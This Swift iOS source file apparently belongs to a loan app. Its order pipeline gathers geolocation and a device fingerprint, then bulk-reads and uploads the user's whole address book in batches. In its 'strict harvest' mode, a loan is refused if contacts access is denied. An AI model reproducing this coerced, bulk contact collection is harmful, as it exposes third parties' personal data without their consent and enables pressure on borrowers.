import Foundation
import Contacts
import RxSwift

struct MintDealDraft {
    let productId: String
    let loanAmount: String
    let showTerm: String
    var orderType: String?
}

/// Geo → (contacts system if needed) → submit → device → contacts upload/ready.
/// Contacts dialog branching aligned with LoanEase business (not code copy).
final class MintDealPipeline {
    private weak var host: UIViewController?
    private let store = MintHubStore.shared
    private var dealId: String?
    /// All order ids from batch submit; device / contacts / ready use the first.
    private var dealIds: [String] = []
    private var isRunning = false
    /// User just answered the system contacts prompt this run — strict mode aborts without secondary sheet.
    private var contactsJustDeniedFromSystem = false
    /// Call sites create this as a local; keep it alive across async geo / network callbacks.
    private var retainWhileRunning: MintDealPipeline?

    init(host: UIViewController) {
        self.host = host
    }

    func execute(draft: MintDealDraft,
                 autoOrder: Bool = false,
                 onSuccess: @escaping ([String]) -> Void,
                 onAbort: (() -> Void)? = nil) {
        execute(drafts: [draft],
                autoOrder: autoOrder,
                onSuccess: onSuccess,
                onAbort: onAbort)
    }

    /// Order submit — same geo / contacts gate, unified `/order/userSubmitDcUpgrade`.
    func execute(drafts: [MintDealDraft],
                 autoOrder: Bool = false,
                 onSuccess: @escaping ([String]) -> Void,
                 onAbort: (() -> Void)? = nil) {
        guard !drafts.isEmpty else {
            onAbort?()
            return
        }
        guard !isRunning else {
            FlexToast.show(FlexPhraseBook.Loan.submitting)
            return
        }
        isRunning = true
        _ = autoOrder
        contactsJustDeniedFromSystem = false
        retainWhileRunning = self
        let strict = RupeeConsentGate.shared.requiresStrictHarvest

        RupeeGeoCoordinator.shared.resolveForDeal(strict: strict) { [weak self] outcome in
            guard let self else { return }
            switch outcome {
            case .coordinates(let lat, let lng):
                self.gateContactsThenSubmit(drafts: drafts,
                                            lat: lat,
                                            lng: lng,
                                            onSuccess: onSuccess,
                                            onAbort: onAbort)
            case .needsSettingsPrompt:
                self.presentGeoSettings(onSuccess: onSuccess, onAbort: onAbort)
            case .deniedFresh:
                self.finishRunning()
                onAbort?()
            case .aborted:
                self.finishRunning()
                onAbort?()
            }
        }
    }

    /// Resume an in-progress order (status 10): device → contacts → ready.
    func resumeExistingDeal(orderId: String,
                            onSuccess: @escaping ([String]) -> Void,
                            onAbort: (() -> Void)? = nil) {
        guard !isRunning else { return }
        isRunning = true
        contactsJustDeniedFromSystem = false
        retainWhileRunning = self
        dealId = orderId
        dealIds = [orderId]
        guard let hostView = host?.view else {
            finishRunning()
            onAbort?()
            return
        }
        FlexSubmitMaskOverlay.show(on: hostView)
        syncDeviceThenContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)
    }

    // MARK: - Contacts system gate (before submit) — LoanEase parity

    /// If undecided, show system contacts dialog first; Allow / Don't Allow both continue to submit.
    private func gateContactsThenSubmit(drafts: [MintDealDraft],
                                        lat: String,
                                        lng: String,
                                        onSuccess: @escaping ([String]) -> Void,
                                        onAbort: (() -> Void)?) {
        let strict = RupeeConsentGate.shared.requiresStrictHarvest
        let access = RupeeContactHarvester.shared.evaluateAccess(strict: strict)
        guard access == .notDetermined else {
            submitChain(drafts: drafts, lat: lat, lng: lng,
                        onSuccess: onSuccess, onAbort: onAbort)
            return
        }

        RupeeContactHarvester.shared.requestSystemAccess { [weak self] _ in
            guard let self else { return }
            self.contactsJustDeniedFromSystem = Self.isContactsUnauthorized()
            self.submitChain(drafts: drafts, lat: lat, lng: lng,
                             onSuccess: onSuccess, onAbort: onAbort)
        }
    }

    private static func isContactsUnauthorized() -> Bool {
        switch CNContactStore.authorizationStatus(for: .contacts) {
        case .authorized: return false
        default: return true
        }
    }

    private func submitChain(drafts: [MintDealDraft], lat: String, lng: String,
                             onSuccess: @escaping ([String]) -> Void,
                             onAbort: (() -> Void)?) {
        guard host?.view != nil else {
            finishRunning()
            onAbort?()
            return
        }

        let productIds = drafts.map(\.productId).joined(separator: ",")
        let loanAmounts = drafts.map(\.loanAmount).joined(separator: ",")
        let loanTerms = drafts.map(\.showTerm).joined(separator: ",")
        let payload: [String: Any] = [
            "productIds": productIds,
            "loanAmounts": loanAmounts,
            "loanTerms": loanTerms,
            "longitude": lng,
            "latitude": lat,
            "imei": "",
            "serialNo": RupeeDeviceProbe.shared.deviceFingerprint
        ]

        let submit = store.submitDeal(payload: payload)

        submit
            .observeOn(MainScheduler.instance)
            .subscribe(onSuccess: { [weak self] config in
                guard let self, let hostView = self.host?.view else {
                    self?.failFlow(FlexPhraseBook.Consent.uploadFailed, onAbort: onAbort)
                    return
                }
                var ids = config.spawnedDealIds
                    .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
                    .filter { !$0.isEmpty }
                if ids.isEmpty, let one = config.spawnedDealId?.trimmingCharacters(in: .whitespacesAndNewlines), !one.isEmpty {
                    ids = [one]
                }
                guard let orderId = ids.first else {
                    self.failFlow(FlexPhraseBook.Consent.uploadFailed, onAbort: onAbort)
                    return
                }
                self.dealIds = ids
                self.dealId = orderId
                FlexSubmitMaskOverlay.show(on: hostView)
                // Capture / ready keyed by first order; success screen uses full `dealIds`.
                self.syncDeviceThenContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)
            }, onError: { [weak self] error in
                let message = (error as? PulseWireFault)?.description ?? FlexPhraseBook.Network.busy
                self?.failFlow(message, onAbort: onAbort)
            })
            .disposed(by: bag)
    }

    private func syncDeviceThenContacts(orderId: String,
                                        onSuccess: @escaping ([String]) -> Void,
                                        onAbort: (() -> Void)?) {
        RupeeDeviceProbe.shared.buildSyncPayload { [weak self] payload in
            guard let self else { return }
            self.store.syncDevice(orderId: orderId, devicePayload: payload)
                .observeOn(MainScheduler.instance)
                .subscribe(onSuccess: { [weak self] in
                    FlexSubmitMaskOverlay.setProgress(0.45)
                    self?.handleContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)
                }, onError: { [weak self] error in
                    guard let self else { return }
                    if RupeeConsentGate.shared.requiresStrictHarvest {
                        let message = (error as? PulseWireFault)?.description ?? FlexPhraseBook.Consent.uploadFailed
                        self.failFlow(message, onAbort: onAbort)
                    } else {
                        self.handleContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)
                    }
                })
                .disposed(by: self.bag)
        }
    }

    // MARK: - Contacts phase after device

    private func handleContacts(orderId: String,
                                onSuccess: @escaping ([String]) -> Void,
                                onAbort: (() -> Void)?) {
        let strict = RupeeConsentGate.shared.requiresStrictHarvest
        let outcome = RupeeContactHarvester.shared.evaluateAccess(strict: strict)

        switch outcome {
        case .uploaded:
            uploadContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)

        case .skippedWeakMode:
            // Non-strict + denied/limited — skip upload, finish ready.
            contactsJustDeniedFromSystem = false
            markReady(orderId: orderId, allowContact: "2", onSuccess: onSuccess, onAbort: onAbort)

        case .notDetermined:
            // Fallback (e.g. resumeExistingDeal) — system dialog then branch.
            RupeeContactHarvester.shared.requestSystemAccess { [weak self] _ in
                guard let self else { return }
                self.contactsJustDeniedFromSystem = Self.isContactsUnauthorized()
                self.handleContacts(orderId: orderId, onSuccess: onSuccess, onAbort: onAbort)
            }

        case .needsSettingsPrompt, .partialUnauthorized:
            if contactsJustDeniedFromSystem {
                // LoanEase: first system Don't Allow / Limited in strict → abort, NO secondary sheet.
                contactsJustDeniedFromSystem = false
                abortContactsUnauthorized(onAbort: onAbort)
            } else {
                // Historically denied — secondary Contacts sheet (strict only reaches here).
                presentContactsSettings(onAbort: onAbort)
            }

        case .aborted:
            returnHomeAndRefresh(onAbort: onAbort)
        }
    }

    private func uploadContacts(orderId: String,
                                onSuccess: @escaping ([String]) -> Void,
                                onAbort: (() -> Void)?) {
        FlexSubmitMaskOverlay.setProgress(0.65)
        // Strictly from app config: pushMaxCount = total cap, pushPerCount = each slice.
        let cap = CofferVault.shared.contactBatchCap
        let batchSize = CofferVault.shared.contactBatchSize

        // Harvest off main — AddressBook walk can be large.
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let rows = RupeeContactHarvester.shared.buildPayload(limit: max(0, cap))
            DispatchQueue.main.async {
                guard let self else { return }
                guard !rows.isEmpty, batchSize > 0 else {
                    // Empty book or no per-slice size from config — still ready.
                    self.markReady(orderId: orderId, allowContact: nil, onSuccess: onSuccess, onAbort: onAbort)
                    return
                }
                self.uploadContactBatch(orderId: orderId, allRows: rows, start: 0, batchSize: batchSize,
                                        onSuccess: onSuccess, onAbort: onAbort)
            }
        }
    }

    private func uploadContactBatch(orderId: String, allRows: [[String: String]], start: Int, batchSize: Int,
                                    onSuccess: @escaping ([String]) -> Void,
                                    onAbort: (() -> Void)?) {
        guard batchSize > 0, start < allRows.count else {
            markReady(orderId: orderId, allowContact: nil, onSuccess: onSuccess, onAbort: onAbort)
            return
        }
        let end = min(start + batchSize, allRows.count)
        let slice = Array(allRows[start..<end])
        store.syncContacts(orderId: orderId, list: slice)
            .observeOn(MainScheduler.instance)
            .subscribe(onSuccess: { [weak self] in
                guard let self else { return }
                if end >= allRows.count {
                    self.markReady(orderId: orderId, allowContact: nil, onSuccess: onSuccess, onAbort: onAbort)
                } else {
                    self.uploadContactBatch(orderId: orderId, allRows: allRows, start: end, batchSize: batchSize,
                                            onSuccess: onSuccess, onAbort: onAbort)
                }
            }, onError: { [weak self] error in
                guard let self else { return }
                if RupeeConsentGate.shared.requiresStrictHarvest {
                    let message = (error as? PulseWireFault)?.description ?? FlexPhraseBook.Consent.uploadFailed
                    self.failFlow(message, onAbort: onAbort)
                } else {
                    self.markReady(orderId: orderId, allowContact: "2", onSuccess: onSuccess, onAbort: onAbort)
                }
            })
            .disposed(by: bag)
    }

    private func markReady(orderId: String, allowContact: String?,
                               onSuccess: @escaping ([String]) -> Void,
                               onAbort: (() -> Void)?) {
        FlexSubmitMaskOverlay.setProgress(0.8)
        store.markDealReady(orderId: orderId, allowContact: allowContact)
            .observeOn(MainScheduler.instance)
            .subscribe(onSuccess: { [weak self] in
                FlexSubmitMaskOverlay.hide()
                // Navigate first, then tear down the pipeline retain cycle.
                let ids = self?.dealIds.isEmpty == false ? (self?.dealIds ?? [orderId]) : [orderId]
                onSuccess(ids)
                self?.finishRunning()
            }, onError: { [weak self] error in
                let message = (error as? PulseWireFault)?.description ?? FlexPhraseBook.Consent.uploadFailed
                self?.failFlow(message, onAbort: onAbort)
            })
            .disposed(by: bag)
    }

    private func presentGeoSettings(onSuccess: @escaping ([String]) -> Void,
                                    onAbort: (() -> Void)?) {
        guard let host else {
            finishRunning()
            onAbort?()
            return
        }
        FlexPermissionSheet.present(on: host, kind: .location,
                                    onConfirm: { [weak self] in
            if let url = URL(string: UIApplication.openSettingsURLString) {
                UIApplication.shared.open(url)
            }
            self?.finishRunning()
            onAbort?()
        }, onCancel: { [weak self] in
            self?.finishRunning()
            onAbort?()
        })
    }

    /// Secondary Contacts sheet — LoanEase: Confirm opens Settings then same abort as Cancel.
    private func presentContactsSettings(onAbort: (() -> Void)?) {
        guard let host else {
            abortContactsUnauthorized(onAbort: onAbort)
            return
        }
        // Keep submit mask under the sheet (LoanEase keeps review overlay visible).
        FlexPermissionSheet.present(on: host, kind: .contacts,
                                    onConfirm: { [weak self] in
            if let url = URL(string: UIApplication.openSettingsURLString) {
                UIApplication.shared.open(url)
            }
            self?.abortContactsUnauthorized(onAbort: onAbort)
        }, onCancel: { [weak self] in
            self?.abortContactsUnauthorized(onAbort: onAbort)
        })
    }

    private func abortContactsUnauthorized(onAbort: (() -> Void)?) {
        returnHomeAndRefresh(onAbort: onAbort)
    }

    private func returnHomeAndRefresh(onAbort: (() -> Void)?) {
        finishRunning()
        FlexSubmitMaskOverlay.hide()
        host?.navigationController?.popToRootViewController(animated: true)
        FlexRootOrchestrator.shared.popToHub()
        NotificationCenter.default.post(name: .flexHubNeedsRefresh, object: nil)
        onAbort?()
    }

    private func failFlow(_ message: String, onAbort: (() -> Void)?) {
        finishRunning()
        FlexSubmitMaskOverlay.hide()
        FlexToast.show(message)
        onAbort?()
    }

    private func finishRunning() {
        isRunning = false
        contactsJustDeniedFromSystem = false
        bag = DisposeBag()
        retainWhileRunning = nil
    }

    private var bag = DisposeBag()
}
